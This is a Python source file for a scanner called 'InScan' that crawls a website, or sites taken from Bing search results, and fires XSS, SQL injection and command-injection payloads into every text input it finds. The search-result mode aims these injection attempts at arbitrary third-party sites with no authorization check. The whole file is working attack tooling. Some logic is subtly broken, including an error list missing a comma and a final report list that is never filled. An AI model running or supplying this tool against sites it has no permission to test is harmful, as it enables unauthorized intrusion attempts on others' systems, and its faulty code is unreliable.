import colorama
from colorama import Fore, Style
import requests
from bs4 import BeautifulSoup
import time

# Initialize colorama
colorama.init(autoreset=True)

# Function to search on a search engine
def print_title():
    title = """
 .___           _________                         
|   |  ____   /   _____/  ____  _____     ____   
|   | /    \  \_____  \ _/ ___\ \__  \   /    \  
|   ||   |  \ /        \\  \___  / __ \_|   |  \ 
|___||___|  //_______  / \___  >(____  /|___|  / 
          \/         \/      \/      \/      \/  
                       v1.1  
                       By: Derek Johnston                         
"""
    print(Fore.BLUE + title + Style.RESET_ALL)
def scan_website(url):
    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}" + Fore.BLUE + f" Crawling and testing: {url}:" + Style.RESET_ALL)
    try:
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            links = soup.find_all('a', href=True)

            for link in links:
                href = link['href']
                if href.startswith('http') or href.startswith('https'):
                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Testing: {href}")
                    test_link(href)

            print("\n=====================")

        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Failed to fetch {url}. Skipping...")
            print("\n=====================")

    except Exception as e:
        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} An error occurred while testing {url}: {e}")
        print("\n=====================")


def test_link(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            input_boxes = soup.find_all('input', {'type': 'text'})

            if not input_boxes:
                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} No injection vectors found.")
                return

            vulnerabilities = []
            xss_vulnerabilities = check_xss(url, input_boxes)
            vulnerabilities.extend(xss_vulnerabilities)
            time.sleep(5)

            sql_vulnerabilities = check_sql_injection(url, input_boxes)
            vulnerabilities.extend(sql_vulnerabilities)
            time.sleep(5)

            command_vulnerabilities = check_command_injection(url, input_boxes)
            vulnerabilities.extend(command_vulnerabilities)
            time.sleep(5)

            if vulnerabilities:
                print(f"{Fore.WHITE}[{Fore.YELLOW}RESULT{Fore.WHITE}]{Fore.RESET} Detected vulnerabilities for {url}:")
                for vuln in vulnerabilities:
                    print(f"- Type: {vuln['type']}, Input Parameter: {vuln['input_param']}, Payload: {vuln['payload']}")
                print("\n=====================")

            else:
                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}" + Fore.GREEN + f" No vulnerabilities found for {url}." + Style.RESET_ALL)

        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Failed to fetch {url}. Skipping...")
            print("\n=====================")

    except Exception as e:
        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} An error occurred while testing {url}: {e}")
        print("\n=====================")


def web_search(query, num_results=5):
    try:
        url = f"https://www.bing.com/search?q={query}&count={num_results}"
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        search_results = soup.find_all('a', href=True)

        relevant_sites = []
        for link in search_results:
            url = link['href']
            if url.startswith('http') and 'microsoft' not in url.lower():
                relevant_sites.append(url)
                if len(relevant_sites) >= num_results:
                    break

        return relevant_sites
    except requests.exceptions.RequestException as e:
        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Error occurred during web search: {e}")
        return []


# Function to check for XSS vulnerability
def check_xss(url, input_boxes):
    vulnerabilities = []

    # Common XSS payloads
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(\"XSS\")'>",
        "<svg/onload=alert('XSS')>",
        "<svg><script>alert('XSS')</script>",
        "'\"><script>alert('XSS')</script>",
        "';alert('XSS');//",
        "%3Cscript%3Ealert('XSS')%3C/script%3E"
    ]

    for input_box in input_boxes:
        if 'name' in input_box.attrs:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Testing for XSS on input box : {Fore.BLUE}{input_box['name']}{Fore.RESET}")
            for payload in payloads:
                data = {input_box['name']: payload}
                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Testing Payload: {payload}")
                response = requests.post(url, data=data)
                if "XSS" in response.text:
                    vulnerabilities.append({
                        'type': 'XSS',
                        'input_param': input_box['name'],
                        'payload': payload,
                        'result': f'XSS Success with payload : {payload}'
                    })
                    print(f"{Fore.WHITE}[{Fore.YELLOW}RESULT{Fore.WHITE}]{Fore.RESET} :{Fore.RED} {vulnerabilities[-1]['result']}")
            if not vulnerabilities:
                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.GREEN} No XSS vulnerability found for input box: {Fore.BLUE}{input_box['name']}{Fore.RESET}")

    return vulnerabilities


# Function to check for SQL injection vulnerability
def check_sql_injection(url, input_boxes):
    vulnerabilities = []

    # Common SQL injection payloads
    payloads = [
        "SELECT * FROM nonexistent_table;",
        ";",
        "'",
        "1=1",
        "' OR 1=1",
        "UNION ALL SELECT 1,2,3 --",
        "1' UNION ALL SELECT 1,2,3 --",
        "1' AND EXISTS(SELECT * FROM information_schema.tables WHERE table_schema=database() LIMIT 1) --"
    ]

    # Errors indicative of different DBMSs
    errors = [
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
        "Server Error"
        "information_schema"

    ]

    for input_box in input_boxes:
        if 'name' in input_box.attrs:
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Testing SQL Injection for input box: {Fore.BLUE}{input_box['name']}{Fore.RESET}")

            for payload in payloads:
                data = {input_box['name']: payload}
                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Testing Payload: {payload}")
                response = requests.post(url, data=data)

                # Check if any of the errors are present in the response
                for error in errors:
                    if error.lower() in response.text.lower():
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'input_param': input_box['name'],
                            'payload': payload,
                            'result': f'Detected potential SQL Injection with payload: {payload}'
                        })
                        print(
                            f"{Fore.WHITE}[{Fore.YELLOW}RESULT{Fore.WHITE}]{Fore.RESET} :{Fore.RED} {vulnerabilities[-1]['result']}")
                        break  # Stop checking further errors for this payload

            if not vulnerabilities:
                print(
                    f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.GREEN} No SQL Injection vulnerability found for input box: {Fore.BLUE}{input_box['name']}{Fore.RESET}")

    return vulnerabilities


# Function to check for command injection vulnerability
def check_command_injection(url, input_boxes):
    vulnerabilities = []

    for input_box in input_boxes:
        if 'name' in input_box.attrs:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Testing Command Injection Payload on input box: {Fore.BLUE}{input_box['name']}{Fore.RESET}")
            payload = "$(echo 'test999111')"
            data = {input_box['name']: payload}
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Testing Payload: {payload}")
            response = requests.post(url, data=data)
            if "test999111" in response.text:
                vulnerabilities.append({
                    'type': 'Command Injection',
                    'input_param': input_box['name'],
                    'result': f"Command execution successful."
                })
                print(f"{Fore.WHITE}[{Fore.YELLOW}RESULT{Fore.WHITE}]{Fore.RESET} :{Fore.RED} {vulnerabilities[-1]['result']}")
            else:
                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} No Command Injection vulnerability found for input box: {Fore.BLUE}{input_box['name']}{Fore.RESET}")

    return vulnerabilities

# Main function
def main():
    try:
        print_title()
        print("Choose option:")
        print(f"{Fore.YELLOW}1.{Fore.RESET} Scan a specific website")
        print(f"{Fore.YELLOW}2.{Fore.RESET} Scan search results")
        option = input("Enter your choice (1 ot 2): ")

        if option == "1":
            url = input("Enter URL to scan with scheme (http/https): ")
            scan_website(url)
        elif option == "2":

            query = input("Enter your search query: ")
            num_results = int(input("Enter the number of sites to test: "))

            search_results = web_search(query, num_results)

            vulnerable_sites = []

            for url in search_results:
                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}" + Fore.BLUE + f" Testing: {url}:" + Style.RESET_ALL)
                try:
                    response = requests.get(url)
                    if response.status_code == 200:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        input_boxes = soup.find_all('input', {'type': 'text'})

                        if not input_boxes:
                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} No injection vectors found.")
                            print("\n=====================")
                            continue

                        xss_vulnerabilities = check_xss(url, input_boxes)
                        time.sleep(5)
                        sql_vulnerabilities = check_sql_injection(url, input_boxes)
                        time.sleep(5)
                        command_vulnerabilities = check_command_injection(url, input_boxes)
                        time.sleep(5)

                        if not xss_vulnerabilities and not sql_vulnerabilities and not command_vulnerabilities:
                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}" + Fore.GREEN + " No vulnerabilities found." + Style.RESET_ALL)

                    else:
                        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Failed to fetch {url}. Skipping...")

                    print("\n=====================")

                except Exception as e:
                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} An error occurred while testing {url}: {e}")
                    print("\n=====================")
                    continue

            if vulnerable_sites:
                print("\n=======REPORT========")
                print("\nVulnerable Sites:")
                for site, vuln_type, input_param in vulnerable_sites:
                    print(f"- Site: {site}, Type: {vuln_type}, Input Parameter: {input_param}")

    except Exception as e:
        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} An error occurred: {e}")

if __name__ == "__main__":
    main()
